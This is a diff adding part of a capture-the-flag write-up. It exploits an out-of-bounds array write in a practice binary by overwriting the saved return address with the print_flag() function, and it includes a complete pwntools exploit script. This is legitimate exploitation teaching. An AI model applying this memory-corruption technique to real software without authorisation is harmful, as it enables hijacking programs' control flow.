@@ -108,9 +108,91 @@ idx:   [rbp-0x34]
 value: [rbp-0x30]
 ```
 
-Visualizing it on the stack, we have:
+We find the index of RIP on the stack:
+```python
+p.sendlineafter(b"array", b"1")
+p.sendlineafter(b"Index: ", b"14")
+p.sendlineafter(b"Value: ", b"1")
+```
 
-```asm
+<img width="806" height="201" alt="image" src="https://github.com/user-attachments/assets/92fe51f0-b2e9-4318-8956-8c8c75deddfa" />
+
+* RIP is starting at index 14, take up the first 4 bytes (`0x..00000001`)
+* We can also see value `idx` and `input` at `rbp-0x38`, each take up 4 bytes in that same memory block.
+  ```asm
+  -038 0x7ffde645c9b8 ◂— 0xe00000001
+  ```
+  ```
+  idx: 0x..00000001 - "1"
+  input: 0xe..      - "14"
+  ```
+
+So now the only thing we need to do is overwrite RIP with the address of `print_flag()` at the right index
+
+We also have to format the address value correctly before sending in order to keep its integrity on stack:
+
+```python
+flag = 0x4011c9
+
+p.sendlineafter(b"array", b"1")
+p.sendlineafter(b"Index: ", b"14")
+p.sendlineafter(b"Value: ", str(flag).encode())
+```
+
+<img width="803" height="239" alt="image" src="https://github.com/user-attachments/assets/1cd4027b-0e70-473f-ba48-98916a47d5fd" />
+
+<img width="806" height="216" alt="image" src="https://github.com/user-attachments/assets/627d0c2e-aabd-4425-9ce6-af484181f631" />
+
+The last thing to do is NULL out the leftover values of the previous address on RIP, which is at idx = 15 (the next 4 bytes)
+
+We have to increment the input to `2` as well, for the second iteration 
+
+```python
+flag = 0x4011c9
+
+p.sendlineafter(b"array", b"2")  // set to 2 for 2 loops
+p.sendlineafter(b"Index: ", b"14")
+p.sendlineafter(b"Value: ", str(flag).encode())
+
+p.sendlineafter(b"Index: ", b"15") 
+p.sendlineafter(b"Value: ", b"0") // NULL out the leftover address
+```
+
+<img width="808" height="212" alt="image" src="https://github.com/user-attachments/assets/8c854863-9a6e-47cb-8d90-7e4f2a15ece7" />
+
+the `print_flag()` at RIP is now fully complete, now we let the program finishes and print out the flag:
+
+<img width="803" height="332" alt="image" src="https://github.com/user-attachments/assets/bb4b02d5-c682-4288-b6fb-186cef204250" />
+
+Here is the full script:
+
+`script.py`:
+```python
+from pwn import *
+
+context.binary = exe = ELF("./vuln", checksec=False)
+context.log_level = "debug"
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		br *main + 136 
+		br *main + 181 
+		''')
 
 
+p = process(exe.path)
+GDB()
 
+flag = 0x4011c9
+
+p.sendlineafter(b"array", b"2")
+p.sendlineafter(b"Index: ", b"14")
+p.sendlineafter(b"Value: ", str(flag).encode())
+
+p.sendlineafter(b"Index: ", b"15")
+p.sendlineafter(b"Value: ", b"0")
+
+
+p.interactive()
+```
+___
